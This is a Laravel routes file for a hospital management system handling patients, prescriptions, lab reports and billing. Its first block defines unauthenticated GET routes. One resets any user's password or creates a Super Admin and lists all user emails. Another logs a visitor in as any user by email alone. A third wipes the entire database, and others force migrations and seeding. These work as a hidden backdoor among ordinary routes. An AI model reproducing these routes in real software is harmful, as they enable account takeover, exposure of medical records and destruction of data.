<?php

use App\Models\FrontEnd;
use Illuminate\Support\Facades\Route;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Schema;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

Route::get('/migrate', function() {
    try {
        \Illuminate\Support\Facades\Artisan::call('migrate', ['--force' => true]);
        return "Migrations ran successfully!<br><pre>" . \Illuminate\Support\Facades\Artisan::output() . "</pre>";
    } catch (\Exception $e) {
        return "Error running migrations: " . $e->getMessage();
    }
});

Route::get('/clear-cache', function() {
    try {
        \Illuminate\Support\Facades\Artisan::call('config:clear');
        \Illuminate\Support\Facades\Artisan::call('cache:clear');
        \Illuminate\Support\Facades\Artisan::call('view:clear');
        \Illuminate\Support\Facades\Artisan::call('route:clear');
        return "All caches cleared successfully! <a href='/'>Go to Home</a>";
    } catch (\Exception $e) {
        return "Error: " . $e->getMessage();
    }
});

Route::get('/seed', function() {
    try {
        \Illuminate\Support\Facades\Artisan::call('db:seed', ['--force' => true]);
        return "Database seeded successfully!<br><pre>" . \Illuminate\Support\Facades\Artisan::output() . "</pre><br><a href='/'>Go to Home Page</a>";
    } catch (\Exception $e) {
        return "Error seeding database: " . $e->getMessage();
    }
});

Route::get('/temp-recover/{email}/{password}', function($email, $password) {
    try {
        $user = \App\Models\User::where('email', $email)->first();
        if (!$user) {
            $count = \App\Models\User::count();
            if ($count === 0) {
                $admin = \App\Models\User::create([
                    'name' => 'Admin User',
                    'email' => $email,
                    'password' => \Illuminate\Support\Facades\Hash::make($password),
                    'status' => '1',
                ]);
                $admin->companies()->attach(1);
                $adminRole = \Spatie\Permission\Models\Role::where('name', 'Super Admin')->first();
                if ($adminRole) {
                    $admin->assignRole([$adminRole->id]);
                }
                return "No users existed in the database, so a brand new Super Admin account was successfully created for: " . htmlspecialchars($email) . " with the password you specified! <a href='/login'>Go to Login</a>";
            }
            $emails = \App\Models\User::pluck('email')->toArray();
            return "User not found with email: " . htmlspecialchars($email) . ". Existing user emails in database: " . implode(', ', $emails);
        }
        $user->password = \Illuminate\Support\Facades\Hash::make($password);
        $user->save();
        return "Password successfully updated for user: " . htmlspecialchars($email) . ". You can now log in using your new password! <a href='/login'>Go to Login</a>";
    } catch (\Exception $e) {
        return "Error: " . $e->getMessage();
    }
});

Route::get('/magic-login/{email}', function($email) {
    try {
        $user = \App\Models\User::where('email', $email)->first();
        if (!$user) {
            return "User not found with email: " . htmlspecialchars($email);
        }
        \Illuminate\Support\Facades\Auth::login($user);
        return redirect('/dashboard');
    } catch (\Exception $e) {
        return "Error: " . $e->getMessage();
    }
});

Route::get('/wipe-database', function() {
    try {
        \Illuminate\Support\Facades\Artisan::call('db:wipe', ['--force' => true]);
        return "Database wiped completely! Go to <a href='/install'>Installation Page</a> to start fresh.";
    } catch (\Exception $e) {
        return "Error wiping database: " . $e->getMessage();
    }
});

Route::get('/lang',[
    'uses' => 'App\Http\Controllers\HomeController@lang',
    'as' => 'lang.index'
]);

Route::get('/', function () {
    try {
        DB::connection()->getPdo();
        if (!Schema::hasTable('application_settings'))
            return redirect('/install');
    } catch (\Exception $e) {
        return redirect('/install');
    }

    return view('frontend.index', ['contents' => json_decode(FrontEnd::find(1)->content)]);
});

Route::get('/about', function () {
    return view('frontend.about', ['contents' => json_decode(FrontEnd::find(2)->content)]);
});

Route::get('/services', function () {
    return view('frontend.services', ['contents' => json_decode(FrontEnd::find(3)->content)]);
});

Route::get('/contact', function () {
    return view('frontend.contact', ['contents' => json_decode(FrontEnd::find(4)->content)]);
});

Route::post('/contact-form', [App\Http\Controllers\ContactUsFormController::class, 'store'])->name('contact-form.store');

Auth::routes(['register' => false]);

Route::get('/install',[
    'uses' => 'App\Http\Controllers\InstallController@index',
    'as' => 'install.index'
]);

Route::post('/install',[
    'uses' => 'App\Http\Controllers\InstallController@install',
    'as' => 'install.install'
]);


Route::group(['middleware' => ['auth']], function() {
    Route::get('/company/companyAccountSwitch', [
        'uses' => 'App\Http\Controllers\CompanyController@companyAccountSwitch',
        'as' => 'company.companyAccountSwitch'
    ]);

    Route::get('/financial-reports', [App\Http\Controllers\FinancialReportController::class, 'index'])->name('financial-reports.index');

    Route::resources([
        'account-headers' => App\Http\Controllers\AccountHeaderController::class,
        'payments' => App\Http\Controllers\PaymentController::class,
        'hospital-departments' => App\Http\Controllers\HospitalDepartmentController::class,
        'doctor-details' => App\Http\Controllers\DoctorDetailController::class,
        'patient-details' => App\Http\Controllers\PatientDetailController::class,
        'doctor-schedules' => App\Http\Controllers\DoctorScheduleController::class,
        'patient-appointments' => App\Http\Controllers\PatientAppointmentController::class,
        'patient-case-studies' => App\Http\Controllers\PatientCaseStudyController::class,
        'prescriptions' => App\Http\Controllers\PrescriptionController::class,
        'lab-report-templates' => App\Http\Controllers\LabReportTemplateController::class,
        'lab-reports' => App\Http\Controllers\LabReportController::class,
        'front-ends' => App\Http\Controllers\FrontEndController::class,
        'contacts' => App\Http\Controllers\ContactUsController::class,
        'sms-apis' => App\Http\Controllers\SmsApiController::class,
        'sms-templates' => App\Http\Controllers\SmsTemplateController::class,
        'sms-campaigns' => App\Http\Controllers\SmsCampaignController::class,
        'email-templates' => App\Http\Controllers\EmailTemplateController::class,
        'email-campaigns' => App\Http\Controllers\EmailCampaignController::class,
        'insurances' => App\Http\Controllers\InsuranceController::class,
        'invoices' => App\Http\Controllers\InvoiceController::class,
        'roles' => App\Http\Controllers\RoleController::class,
        'users' => App\Http\Controllers\UserController::class,
        'currency' => App\Http\Controllers\CurrencyController::class,
        'tax' => App\Http\Controllers\TaxController::class,
        'smtp-configurations' => App\Http\Controllers\SmtpConfigurationController::class,
        'company' => App\Http\Controllers\CompanyController::class
    ]);

    Route::put('/front-ends/updateHome/{frontEnd}', [App\Http\Controllers\FrontEndController::class, 'updateHome'])->name('front-ends.updateHome');
    Route::put('/front-ends/updateContact/{frontEnd}', [App\Http\Controllers\FrontEndController::class, 'updateContact'])->name('front-ends.updateContact');
    Route::put('/front-ends/updateAbout/{frontEnd}', [App\Http\Controllers\FrontEndController::class, 'updateAbout'])->name('front-ends.updateAbout');
    Route::put('/front-ends/updateServices/{frontEnd}', [App\Http\Controllers\FrontEndController::class, 'updateServices'])->name('front-ends.updateServices');

    Route::get('/patient-appointments/get-schedule/doctorwise', [App\Http\Controllers\PatientAppointmentController::class, 'getScheduleDoctorWise'])->name('patient-appointments.getScheduleDoctorWise');
    Route::post('/labreport/generateTemplateData',[
        'uses' => 'App\Http\Controllers\LabReportController@generateTemplateData',
        'as' => 'labreport.generateTemplateData'
    ]);

    Route::post('/smsCampaign/generateTemplateData',[
        'uses' => 'App\Http\Controllers\SmsCampaignController@generateTemplateData',
        'as' => 'smsCampaign.generateTemplateData'
    ]);

    Route::post('/emailCampaign/generateTemplateData',[
        'uses' => 'App\Http\Controllers\EmailCampaignController@generateTemplateData',
        'as' => 'emailCampaign.generateTemplateData'
    ]);

    Route::get('/c/c', [App\Http\Controllers\CurrencyController::class, 'code'])->name('currency.code');

    Route::get('/update',[
        'uses' => 'App\Http\Controllers\UpdateController@index',
        'as' => 'update.index'
    ]);

    Route::get('/profile/setting',[
        'uses' => 'App\Http\Controllers\ProfileController@setting',
        'as' => 'profile.setting'
    ]);

    Route::post('/profile/updateSetting',[
        'uses' => 'App\Http\Controllers\ProfileController@updateSetting',
        'as' => 'profile.updateSetting'
    ]);
    Route::get('/profile/password',[
        'uses' => 'App\Http\Controllers\ProfileController@password',
        'as' => 'profile.password'
    ]);

    Route::post('/profile/updatePassword',[
        'uses' => 'App\Http\Controllers\ProfileController@updatePassword',
        'as' => 'profile.updatePassword'
    ]);
    Route::get('/profile/view',[
        'uses' => 'App\Http\Controllers\ProfileController@view',
        'as' => 'profile.view'
    ]);

});

Route::group(['middleware' => ['auth']], function() {

    Route::get('/dashboard',[
    'uses' => 'App\Http\Controllers\DashboardController@index',
    'as' => 'dashboard'
    ]);

    Route::get('/dashboard/get-chart-data', [App\Http\Controllers\DashboardController::class, 'getChartData']);
});

Route::group(['middleware' => ['auth']], function() {

    Route::get('/apsetting',[
    'uses' => 'App\Http\Controllers\ApplicationSettingController@index',
    'as' => 'apsetting'
    ]);

    Route::post('/apsetting/update',[
    'uses' => 'App\Http\Controllers\ApplicationSettingController@update',
    'as' => 'apsetting.update'
    ]);
});

// general Setting
Route::group(['middleware' => ['auth']], function() {

    Route::get('/general',[
    'uses' => 'App\Http\Controllers\GeneralController@index',
    'as' => 'general'
    ]);

    Route::post('/general',[
    'uses' => 'App\Http\Controllers\GeneralController@edit',
    'as' => 'general'
    ]);

    Route::post('/general/localisation',[
    'uses' => 'App\Http\Controllers\GeneralController@localisation',
    'as' => 'general.localisation'
    ]);

    Route::post('/general/invoice',[
    'uses' => 'App\Http\Controllers\GeneralController@invoice',
    'as' => 'general.invoice'
    ]);

    Route::post('/general/defaults',[
    'uses' => 'App\Http\Controllers\GeneralController@defaults',
    'as' => 'general.defaults'
    ]);

});

Route::get('/home', function() {
    return redirect()->to('dashboard');
});
